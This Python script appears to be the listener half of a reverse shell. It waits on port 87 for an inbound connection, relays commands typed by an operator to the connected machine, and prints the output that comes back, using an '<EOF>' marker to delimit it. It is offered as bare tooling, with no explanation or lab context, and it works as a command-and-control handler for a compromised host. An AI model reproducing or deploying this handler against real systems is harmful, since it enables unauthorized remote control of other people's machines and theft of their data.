import socket

host = '0.0.0.0'
port = 87

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))

server.listen(1)
print(f"[+] Listening on {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

try:
    while True:
        cwd = conn.recv(1024).decode().strip()

        command = input(f"{cwd}> ")

        while not command.strip():
            command = input(f"{cwd}> ")

        conn.send(command.encode())

        if command.lower() == "exit":
            break

        data = b""

        while True:
            chunk = conn.recv(4096)
            data += chunk
            if b"<EOF>" in data:
                break

        output = data.decode(errors="ignore").replace("<EOF>", "")
        print(output)

finally:
    conn.close()
    server.close()
